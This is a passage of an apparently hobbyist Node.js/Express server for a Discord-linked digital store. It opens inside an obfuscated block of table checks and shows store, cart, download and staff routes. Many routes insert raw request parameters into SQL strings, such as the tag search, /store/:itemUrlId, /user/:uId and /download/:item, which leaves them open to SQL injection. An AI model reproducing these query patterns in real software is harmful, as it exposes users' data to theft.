          _0x11dc63 &&
            (console[_0x510ae1(0x15a)](_0x510ae1(0x194)),
            process[_0x510ae1(0x166)]());
        }
      ),
      connection[_0x498ff8(0x189)](_0x498ff8(0x132), (_0xb56c4e, _0xafbfbc) => {
        const _0x3578de = _0x498ff8;
        _0xb56c4e &&
          (console["log"](_0x3578de(0x154)), process[_0x3578de(0x166)]());
      }),
      connection[_0x498ff8(0x189)](
        "SELECT\x20*\x20FROM\x20storeitems",
        (_0x225124, _0x3dfb15) => {
          const _0x3ed9cf = _0x498ff8;
          _0x225124 &&
            (console[_0x3ed9cf(0x15a)](_0x3ed9cf(0x199)),
            process[_0x3ed9cf(0x166)]());
        }
      ),
      connection["query"](_0x498ff8(0x182), (_0x190333, _0x2251c2) => {
        const _0x4ca8c4 = _0x498ff8;
        _0x190333 &&
          (console[_0x4ca8c4(0x15a)](
            "\x1b[31mSQL\x20error.\x20gallery\x20table\x20not\x20found.\x1b[0m"
          ),
          process["exit"]());
      }),
      connection[_0x498ff8(0x189)](_0x498ff8(0x193), (_0x4016c3, _0xd721a5) => {
        const _0x157e45 = _0x498ff8;
        _0x4016c3 &&
          (console[_0x157e45(0x15a)](
            "\x1b[31mSQL\x20error.\x20teammembers\x20table\x20not\x20found.\x1b[0m"
          ),
          process[_0x157e45(0x166)]());
      }),
      connection[_0x498ff8(0x189)](_0x498ff8(0x1af), (_0xeb25f, _0x2985a2) => {
        const _0x22488b = _0x498ff8;
        _0xeb25f &&
          (console[_0x22488b(0x15a)](_0x22488b(0x13b)),
          process[_0x22488b(0x166)]());
      }),
      connection[_0x498ff8(0x189)](
        "SELECT\x20*\x20FROM\x20reviewResponses",
        (_0x3eac91, _0x59504f) => {
          const _0x1be120 = _0x498ff8;
          _0x3eac91 &&
            (console[_0x1be120(0x15a)](_0x1be120(0x174)),
            process[_0x1be120(0x166)]());
        }
      ),
      connection["query"](_0x498ff8(0x13e), (_0x584921, _0x3bec19) => {
        const _0x253328 = _0x498ff8;
        _0x584921 &&
          (console["log"](_0x253328(0x10a)), process[_0x253328(0x166)]());
      }),
      connection[_0x498ff8(0x189)](
        "SELECT\x20*\x20FROM\x20itemsOwned",
        (_0x30cb8e, _0x51f2cc) => {
          const _0x5bfcf1 = _0x498ff8;
          _0x30cb8e &&
            (console[_0x5bfcf1(0x15a)](_0x5bfcf1(0xfc)), process["exit"]());
        }
      ),
      connection[_0x498ff8(0x189)](_0x498ff8(0x168), (_0x1116ae, _0x3d542d) => {
        const _0x1fdbc1 = _0x498ff8;
        _0x1116ae &&
          (console[_0x1fdbc1(0x15a)](
            "\x1b[31mSQL\x20error.\x20productDownloads\x20table\x20not\x20found.\x1b[0m"
          ),
          process[_0x1fdbc1(0x166)]());
      }),
      connection["query"](_0x498ff8(0x180), (_0x5b09ed, _0x2fe347) => {
        const _0x156caa = _0x498ff8;
        _0x5b09ed &&
          (console["log"](_0x156caa(0x136)), process[_0x156caa(0x166)]());
      }),
      connection[_0x498ff8(0x189)](_0x498ff8(0x149), (_0x81e14c, _0xb772f6) => {
        const _0x1e9ddf = _0x498ff8;
        _0x81e14c &&
          (console[_0x1e9ddf(0x15a)](
            "\x1b[31mSQL\x20error.\x20promocodes\x20table\x20not\x20found.\x1b[0m"
          ),
          process["exit"]());
      }),
      connection[_0x498ff8(0x189)](_0x498ff8(0x15b), (_0x34763d, _0xc3daeb) => {
        const _0x517171 = _0x498ff8;
        _0x34763d &&
          (console["log"](_0x517171(0x161)), process[_0x517171(0x166)]());
      });
  });

// Pages //
app.get("/", async function (req, res) {
  insertStat("homevisits", 1);
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        connection.query("SELECT * FROM tags", (err, tagResults) => {
          connection.query(
            "SELECT * FROM reviews ORDER BY RAND() LIMIT 4",
            (err, reviewResults) => {
              if (settingResults[0].featuredItem) {
                connection.query(
                  `SELECT * FROM storeitems WHERE id = ${settingResults[0].featuredItem}`,
                  (err, featItemResults) => {
                    res.render("index", {
                      discordInfo: disData,
                      siteInfo: settingResults[0],
                      tags: tagResults,
                      featItem: featItemResults[0],
                      reviews: reviewResults,
                    });
                  }
                );
              } else {
                res.render("index", {
                  discordInfo: disData,
                  siteInfo: settingResults[0],
                  tags: tagResults,
                  featItem: null,
                  reviews: reviewResults,
                });
              }
            }
          );
        });
      }
    );
  });
});
app.get("/search", async function (req, res) {
  let searchQuery = req.query.q;
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].searchEnabled) return res.redirect("/404");
        connection.query("SELECT * FROM tags", (err, tagResults) => {
          if (!searchQuery)
            return res.render("search", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              results: false,
              searchData: {},
              query: null,
              tags: tagResults,
            });
          if (searchQuery.startsWith("tag:")) {
            let tag = searchQuery.split(":")[1];
            connection.query(
              `SELECT * FROM storeitems WHERE tags LIKE '%${tag}%' AND hidden = false`,
              (err, searchResults) => {
                res.render("search", {
                  discordInfo: disData,
                  siteInfo: settingResults[0],
                  results: true,
                  searchData: searchResults,
                  query: searchQuery,
                  tags: tagResults,
                });
              }
            );
          } else {
            connection.query(
              `SELECT * FROM storeitems WHERE title LIKE '%${searchQuery.replace(
                /'/gi,
                "''"
              )}%' OR description LIKE '%${searchQuery.replace(
                /'/gi,
                "''"
              )}%' OR credits LIKE '%${searchQuery.replace(
                /'/gi,
                "''"
              )}%' AND hidden = false`,
              (err, searchResults) => {
                res.render("search", {
                  discordInfo: disData,
                  siteInfo: settingResults[0],
                  results: true,
                  searchData: searchResults,
                  query: searchQuery,
                  tags: tagResults,
                });
              }
            );
          }
        });
      }
    );
  });
});

app.get("/store", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].storeEnabled) return res.redirect("/404");
        connection.query(
          "SELECT * FROM storeitems WHERE hidden = false ORDER BY position",
          (err, storeResults) => {
            connection.query("SELECT * FROM tags", (err, tagResults) => {
              res.render("store", {
                discordInfo: disData,
                siteInfo: settingResults[0],
                storeItems: storeResults,
                tags: tagResults,
              });
            });
          }
        );
      }
    );
  });
});
app.get("/store/:itemUrlId", async function (req, res) {
  let itemUrlId = req.params.itemUrlId;
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        connection.query(
          `SELECT * FROM storeitems WHERE urlId = '${itemUrlId}'`,
          (err, storeResults) => {
            if (storeResults[0]) {
              connection.query(
                `SELECT * FROM reviews WHERE product = '${storeResults[0].title}' ORDER BY RAND() LIMIT 4`,
                (err, reviewResults) => {
                  connection.query("SELECT * FROM tags", (err, tagResults) => {
                    if (storeResults[0].requiredItem) {
                      connection.query(
                        `SELECT * FROM storeitems WHERE id = ${storeResults[0].requiredItem}`,
                        (err, requiredItemResults) => {
                          res.render("storeview", {
                            discordInfo: disData,
                            siteInfo: settingResults[0],
                            storeItem: storeResults[0],
                            tags: tagResults,
                            reqItem: requiredItemResults[0],
                            reviews: reviewResults,
                            mdConvert: md,
                          });
                        }
                      );
                    } else {
                      res.render("storeview", {
                        discordInfo: disData,
                        siteInfo: settingResults[0],
                        storeItem: storeResults[0],
                        tags: tagResults,
                        reqItem: null,
                        reviews: reviewResults,
                        mdConvert: md,
                      });
                    }
                  });
                }
              );
            } else {
              res.render("404", {
                discordInfo: disData,
                siteInfo: settingResults[0],
              });
            }
          }
        );
      }
    );
  });
});
app.get("/store/:itemUrlId/edit", async function (req, res) {
  let itemUrlId = req.params.itemUrlId;
  getDiscordUserInfo(req, res, function (disData) {
    if (disData.permType == 1) {
      connection.query(
        "SELECT * FROM sitesettings WHERE id = 1",
        (err, settingResults) => {
          connection.query(
            `SELECT * FROM storeitems WHERE urlId = '${itemUrlId}'`,
            (err, storeResults) => {
              connection.query("SELECT * FROM tags", (err, tagResults) => {
                connection.query(
                  "SELECT * FROM storeitems",
                  (err, storeItemsResults) => {
                    res.render("staffedititem", {
                      discordInfo: disData,
                      siteInfo: settingResults[0],
                      storeItem: storeResults[0],
                      tags: tagResults,
                      storeItems: storeItemsResults,
                      mdConvert: md,
                    });
                  }
                );
              });
            }
          );
        }
      );
    } else {
      return res.redirect(`/store/${itemUrlId}`);
    }
  });
});
app.get("/releases", async function (req, res) {
  return res.redirect("/");
});
app.get("/releases/:productId", async function (req, res) {
  let productId = req.params.productId;
  if (!Number(productId))
    return res.redirect(`/error?err=This item does not exist.`);
  if (req.isAuthenticated()) {
    getDiscordUserInfo(req, res, function (disData) {
      connection.query(
        "SELECT * FROM sitesettings WHERE id = 1",
        (err, settingResults) => {
          connection.query(
            `SELECT * FROM storeitems WHERE id = ${productId}`,
            (err, storeResults) => {
              if (storeResults[0]) {
                connection.query(
                  `SELECT * FROM productDownloads WHERE productId = ${storeResults[0].id} ORDER BY id DESC`,
                  (err, releasesResults) => {
                    if (storeResults[0].itemType == 1) {
                      connection.query(
                        `SELECT * FROM itemsOwned WHERE productId = ${storeResults[0].id} AND userId = '${req.user.id}'`,
                        (err, ownedResults) => {
                          if (ownedResults[0]) {
                            res.render("releases", {
                              discordInfo: disData,
                              siteInfo: settingResults[0],
                              storeItem: storeResults[0],
                              releases: releasesResults,
                              mdConvert: md,
                            });
                          } else {
                            return res.redirect(
                              `/error?err=You must own this item to access the releases.`
                            );
                          }
                        }
                      );
                    } else {
                      res.render("releases", {
                        discordInfo: disData,
                        siteInfo: settingResults[0],
                        storeItem: storeResults[0],
                        releases: releasesResults,
                        mdConvert: md,
                      });
                    }
                  }
                );
              } else {
                return res.redirect(`/error?err=This item does not exist.`);
              }
            }
          );
        }
      );
    });
  } else {
    return res.redirect("/login");
  }
});

app.get("/releases/create/:productId", async function (req, res) {
  let productId = req.params.productId;
  connection.query(
    "SELECT * FROM sitesettings WHERE id = 1",
    (err, settingResults) => {
      getDiscordUserInfo(req, res, function (disData) {
        if (disData.permType == 1) {
          connection.query(
            `SELECT * FROM storeitems WHERE id = ${productId}`,
            (err, storeResults) => {
              res.render("releasecreate", {
                discordInfo: disData,
                siteInfo: settingResults[0],
                storeItem: storeResults[0],
              });
            }
          );
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      });
    }
  );
});

app.get("/team", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].teamEnabled) return res.redirect("/404");
        connection.query(
          "SELECT * FROM teammembers  ORDER BY position",
          (err, teamResults) => {
            res.render("team", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              team: teamResults,
            });
          }
        );
      }
    );
  });
});
app.get("/partners", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].partnersEnabled) return res.redirect("/404");
        connection.query(
          "SELECT * FROM partners ORDER BY position",
          (err, partnersResults) => {
            res.render("partners", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              partners: partnersResults,
              mdConvert: md,
            });
          }
        );
      }
    );
  });
});
app.get("/reviews", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].reviewsEnabled) return res.redirect("/404");
        connection.query("SELECT * FROM reviews", (err, reviewResults) => {
          res.render("reviews", {
            discordInfo: disData,
            siteInfo: settingResults[0],
            reviews: reviewResults,
          });
        });
      }
    );
  });
});
app.get("/review", async function (req, res) {
  return res.redirect("/reviews");
});
app.get("/review/:id", async function (req, res) {
  let reviewId = req.params.id;
  if (!Number(reviewId))
    return res.redirect(`/error?err=This review does not exist.`);
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].reviewsEnabled) return res.redirect("/404");
        connection.query(
          `SELECT * FROM reviews WHERE id = ${reviewId}`,
          (err, reviewResults) => {
            connection.query(
              `SELECT * FROM reviewResponses WHERE reviewId = ${reviewId}`,
              (err, reviewRespsResults) => {
                if (!reviewRespsResults[0]) reviewRespsResults[0] = null;
                if (!reviewResults[0])
                  return res.render("404", {
                    discordInfo: disData,
                    siteInfo: settingResults[0],
                  });
                res.render("viewreview", {
                  discordInfo: disData,
                  siteInfo: settingResults[0],
                  review: reviewResults[0],
                  reviewResp: reviewRespsResults[0],
                  mdConvert: md,
                });
              }
            );
          }
        );
      }
    );
  });
});
app.get("/reviews/create", async function (req, res) {
  if (req.isAuthenticated()) {
    getDiscordUserInfo(req, res, function (disData) {
      if (disData.itemCount > 0) {
        connection.query(
          "SELECT * FROM sitesettings WHERE id = 1",
          (err, settingResults) => {
            connection.query(
              `SELECT * FROM itemsOwned WHERE userId = '${req.user.id}'`,
              (err, ownedResults) => {
                res.render("reviewcreate", {
                  discordInfo: disData,
                  siteInfo: settingResults[0],
                  ownedItems: ownedResults,
                });
              }
            );
          }
        );
      } else {
        return res.redirect("/reviews");
      }
    });
  } else {
    res.redirect("/login");
  }
});
app.get("/tos", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].tosEnabled) return res.redirect("/404");
        res.render("tos", {
          discordInfo: disData,
          siteInfo: settingResults[0],
          mdConvert: md,
        });
      }
    );
  });
});
app.get("/gallery", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].galleryEnabled) return res.redirect("/404");
        connection.query("SELECT * FROM gallery", (err, galleryResults) => {
          res.render("gallery", {
            discordInfo: disData,
            siteInfo: settingResults[0],
            gallery: galleryResults,
          });
        });
      }
    );
  });
});

app.get("/404", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (!settingResults[0].fourfourEnabled) return res.redirect("/404");
        res.render("404", {
          discordInfo: disData,
          siteInfo: settingResults[0],
        });
      }
    );
  });
});
app.get("/403", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        res.render("403", {
          discordInfo: disData,
          siteInfo: settingResults[0],
        });
      }
    );
  });
});
app.get("/maintenance", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        res.render("503", {
          discordInfo: disData,
          siteInfo: settingResults[0],
        });
      }
    );
  });
});
app.get("/banned", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        res.render("banned", {
          discordInfo: disData,
          siteInfo: settingResults[0],
        });
      }
    );
  });
});
app.get("/sttbanned", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        res.render("sttbanned", {
          discordInfo: disData,
          siteInfo: settingResults[0],
        });
      }
    );
  });
});
app.get("/error", async function (req, res) {
  var error = req.query.err || "An error occured, go back.";
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        res.render("error", {
          discordInfo: disData,
          siteInfo: settingResults[0],
          error: error,
        });
      }
    );
  });
});

app.get("/user", async function (req, res) {
  res.redirect("/");
});
app.get("/user/:uId", async function (req, res) {
  let uId = req.params.uId;
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        connection.query(
          `SELECT * FROM users WHERE userId = '${uId}'`,
          (err, userResults) => {
            if (userResults[0]) {
              connection.query(
                `SELECT * FROM storeitems`,
                (err, storeResults) => {
                  connection.query(
                    `SELECT * FROM itemsOwned WHERE userId = '${uId}'`,
                    (err, ownedItemsResults) => {
                      connection.query(
                        `SELECT * FROM giftCards WHERE userId = '${uId}'`,
                        (err, giftResults) => {
                          res.render("user", {
                            discordInfo: disData,
                            siteInfo: settingResults[0],
                            user: userResults[0],
                            storeItems: storeResults,
                            ownedItems: ownedItemsResults,
                            giftcards: giftResults,
                          });
                        }
                      );
                    }
                  );
                }
              );
            } else {
              res.render("404", {
                discordInfo: disData,
                siteInfo: settingResults[0],
              });
            }
          }
        );
      }
    );
  });
});
app.get("/giftcards", async function (req, res) {
  if (req.isAuthenticated()) {
    getDiscordUserInfo(req, res, function (disData) {
      connection.query(
        "SELECT * FROM sitesettings WHERE id = 1",
        (err, settingResults) => {
          if (settingResults[0].giftcardsEnabled) {
            connection.query(
              `SELECT * FROM storeitems WHERE title LIKE '%Gift Card%'`,
              (err, storeResults) => {
                res.render("giftcards", {
                  discordInfo: disData,
                  siteInfo: settingResults[0],
                  storeItems: storeResults,
                });
              }
            );
          } else {
            res.render("404", {
              discordInfo: disData,
              siteInfo: settingResults[0],
            });
          }
        }
      );
    });
  } else {
    res.redirect("/login");
  }
});
app.get("/cart", async function (req, res) {
  var error = req.query.err || null;
  if (req.isAuthenticated()) {
    getDiscordUserInfo(req, res, function (disData) {
      connection.query(
        "SELECT * FROM sitesettings WHERE id = 1",
        (err, settingResults) => {
          connection.query("SELECT * FROM storeitems", (err, storeResults) => {
            res.render("cart", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              storeItems: storeResults,
              error: error,
            });
          });
        }
      );
    });
  } else {
    res.redirect("/login");
  }
});
app.get("/addcart/:rId", async function (req, res) {
  if (!req.session.cartItems) {
    req.session.cartItems = [];
  }
  let rId = req.params.rId;
  connection.query(
    `SELECT * FROM storeitems WHERE id = ${rId}`,
    (err, storeResults) => {
      var cart = req.session.cartItems;
      cart.push(Number(rId));
      req.session.cartItems = cart;
      if (req.isAuthenticated()) {
        if (storeResults[0].requiredItem) {
          connection.query(
            `SELECT * FROM itemsOwned WHERE productId = ${storeResults[0].requiredItem} AND userId = ${req.user.id}`,
            (err, ownedResults) => {
              if (ownedResults[0]) {
                // pass
                // var cart = req.session.cartItems;
                // cart.push(Number(rId));
                // req.session.cartItems = cart;
                res.redirect(`/cart`);
              } else {
                // fail
                res.redirect(
                  `/error?err=You must own the required item to purchase this item.`
                );
              }
            }
          );
        } else {
          // pass
          if (req.isAuthenticated()) {
            // var cart = req.session.cartItems;
            // cart.push(Number(rId));
            // req.session.cartItems = cart;
            res.redirect(`/cart`);
          } else {
            res.redirect("/login");
          }
        }
      } else {
        res.redirect("/login");
      }
    }
  );
});

app.get("/removecart/:rId", async function (req, res) {
  let rId = req.params.rId;
  if (req.isAuthenticated()) {
    var cart = req.session.cartItems;
    const index = cart.indexOf(Number(rId));
    if (index > -1) {
      cart.splice(index, 1);
    }
    req.session.cartItems = cart;
    res.redirect(`/cart`);
  } else {
    res.redirect("/login");
  }
});
app.get("/download/:item", async function (req, res) {
  let item = req.params.item;
  if (req.isAuthenticated()) {
    connection.query(
      `SELECT * FROM productDownloads WHERE id = ${item}`,
      (err, downloadResult) => {
        if (err) console.error(err);
        if (downloadResult[0]) {
          connection.query(
            `SELECT * FROM storeitems WHERE id = ${downloadResult[0].productId}`,
            (err, storeResult) => {
              if (err) console.error(err);
              if (storeResult[0]) {
                if (storeResult[0].itemType == 1) {
                  // Paid
                  connection.query(
                    `SELECT * FROM itemsOwned WHERE productId = ${downloadResult[0].productId} AND userId = '${req.user.id}'`,
                    (err, ownedResult) => {
                      if (ownedResult[0]) {
                        let nameExt = downloadResult[0].sourceFile.substr(
                          downloadResult[0].sourceFile.lastIndexOf(".") + 1
                        );
                        res.download(
                          `./files/${downloadResult[0].sourceFile}`,
                          `${storeResult[0].title} - ${req.user.username}.${nameExt}`
                        );
                        insertStat("downloads", 1);
                        connection.query(
                          `UPDATE itemsOwned SET downloads = downloads + 1 WHERE id = ${ownedResult[0].id}`,
                          (err, result) => {
                            if (err) console.log(err);
                          }
                        );
                      } else {
                        res.redirect(`/user/${req.user.id}`);
                      }
                    }
                  );
                } else {
                  // Free
                  let nameExt = downloadResult[0].sourceFile.substr(
                    downloadResult[0].sourceFile.lastIndexOf(".") + 1
                  );
                  res.download(
                    `./files/${downloadResult[0].sourceFile}`,
                    `${storeResult[0].title} - ${req.user.username}.${nameExt}`
                  );
                  insertStat("downloads", 1);
                }
              } else {
                res.redirect(`/user/${req.user.id}`);
              }
            }
          );
        } else {
          res.redirect(`/user/${req.user.id}`);
        }
      }
    );
  } else {
    res.redirect("/");
  }
});
app.get("/download/latest/:proId", async function (req, res) {
  let proId = req.params.proId;
  if (!isNumeric(proId)) return;
  if (req.isAuthenticated()) {
    connection.query(
      `SELECT * FROM productDownloads WHERE productId = ${proId} ORDER BY id DESC`,
      (err, downloadResult) => {
        if (downloadResult[0]) {
          connection.query(
            `SELECT * FROM storeitems WHERE id = ${downloadResult[0].productId}`,
            (err, storeResult) => {
              if (storeResult[0]) {
                if (storeResult[0].itemType == 1) {
                  // Paid
                  connection.query(
                    `SELECT * FROM itemsOwned WHERE productId = ${proId} AND userId = '${req.user.id}'`,
                    (err, ownedResult) => {
                      if (ownedResult[0]) {
                        let nameExt = downloadResult[0].sourceFile.substr(
                          downloadResult[0].sourceFile.lastIndexOf(".") + 1
                        );
                        res.download(
                          `./files/${downloadResult[0].sourceFile}`,
                          `${storeResult[0].title} - ${req.user.username}.${nameExt}`
                        );
                        insertStat("downloads", 1);
                        connection.query(
                          `UPDATE itemsOwned SET downloads = downloads + 1 WHERE id = ${ownedResult[0].id}`,
                          (err, result) => {
                            if (err) console.log(err);
                          }
                        );
                      } else {
                        res.redirect(`/user/${req.user.id}`);
                      }
                    }
                  );
                } else {
                  // Free
                  let nameExt = downloadResult[0].sourceFile.substr(
                    downloadResult[0].sourceFile.lastIndexOf(".") + 1
                  );
                  res.download(
                    `./files/${downloadResult[0].sourceFile}`,
                    `${storeResult[0].title} - ${req.user.username}.${nameExt}`
                  );
                  insertStat("downloads", 1);
                }
              } else {
                res.redirect(`/user/${req.user.id}`);
              }
            }
          );
        } else {
          res.redirect(`/user/${req.user.id}`);
        }
      }
    );
  } else {
    res.redirect("/");
  }
});

// Staff Pages //
app.get("/staff", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType < 3) {
          res.render("staffindex", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        } else {
          res.redirect("/login");
        }
      }
    );
  });
});
app.get("/staff/settings", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          connection.query("SELECT * FROM tags", (err, tagsResults) => {
            res.render("staffsettings", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              tags: tagsResults,
            });
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/insights", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType < 3) {
          res.render("staffinsights", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/store", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          connection.query("SELECT * FROM storeitems", (err, storeResults) => {
            connection.query(
              "SELECT * FROM promocodes",
              (err, promoResults) => {
                res.render("staffstore", {
                  discordInfo: disData,
                  siteInfo: settingResults[0],
                  storeItems: storeResults,
                  promoCodes: promoResults,
                });
              }
            );
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/itemcreate", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          connection.query("SELECT * FROM tags", (err, tagResults) => {
            connection.query(
              "SELECT * FROM storeitems",
              (err, storeResults) => {
                res.render("staffitemcreate", {
                  discordInfo: disData,
                  siteInfo: settingResults[0],
                  error: false,
                  tags: tagResults,
                  storeItems: storeResults,
                });
              }
            );
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/gallery", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          connection.query("SELECT * FROM gallery", (err, galleryResults) => {
            res.render("staffgallery", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              gallery: galleryResults,
            });
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/homepage", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          connection.query("SELECT * FROM storeitems", (err, storeResults) => {
            if (settingResults[0].featuredItem) {
              connection.query(
                `SELECT * FROM storeitems WHERE id = ${settingResults[0].featuredItem}`,
                (err, featItemResults) => {
                  res.render("staffhomepage", {
                    discordInfo: disData,
                    siteInfo: settingResults[0],
                    storeItems: storeResults,
                    featItem: featItemResults[0],
                  });
                }
              );
            } else {
              res.render("staffhomepage", {
                discordInfo: disData,
                siteInfo: settingResults[0],
                storeItems: storeResults,
                featItem: null,
              });
            }
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/teampage", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          connection.query("SELECT * FROM teammembers", (err, teamResults) => {
            res.render("staffteampage", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              team: teamResults,
            });
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/tospage", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          res.render("stafftospage", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/users", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType < 3) {
          connection.query("SELECT * FROM users", (err, usersResults) => {
            res.render("staffusers", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              users: usersResults,
            });
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/admins", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          connection.query(
            "SELECT * FROM users WHERE NOT permType = 4",
            (err, usersResults) => {
              res.render("staffadmins", {
                discordInfo: disData,
                siteInfo: settingResults[0],
                admins: usersResults,
              });
            }
          );
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});
app.get("/staff/partners", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType == 1) {
          connection.query("SELECT * FROM partners", (err, partnerResults) => {
            res.render("staffpartners", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              partners: partnerResults,
            });
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});

app.get("/staff/owneditems", async function (req, res) {
  getDiscordUserInfo(req, res, function (disData) {
    connection.query(
      "SELECT * FROM sitesettings WHERE id = 1",
      (err, settingResults) => {
        if (disData.permType < 3) {
          connection.query("SELECT * FROM itemsOwned", (err, ownedResults) => {
            res.render("staffowned", {
              discordInfo: disData,
              siteInfo: settingResults[0],
              ownedItems: ownedResults,
            });
          });
        } else {
          res.render("403", {
            discordInfo: disData,
            siteInfo: settingResults[0],
          });
        }
      }
    );
  });
});

// Redirects
config["redirects"].forEach((element) => {
  app.get(`/${element.name}`, async function (req, res) {
    res.redirect(element.link);
  });
});

// Discord Bot Commands //
if (config["discordConfig"].useDiscordCommands) {
  bot.on("message", async (message) => {
    if (
      !message.content.startsWith(config["discordConfig"].commandPrefix) ||
      message.author.bot
    )
      return;
    const args = message.content
      .slice(config["discordConfig"].commandPrefix.length)
      .trim()
      .split(/ +/);
    const command = args.shift().toLowerCase();
    if (command === "search") {
      message.delete().catch();
      let searchTerm = args.join(" ");
      if (searchTerm.length > 0) {
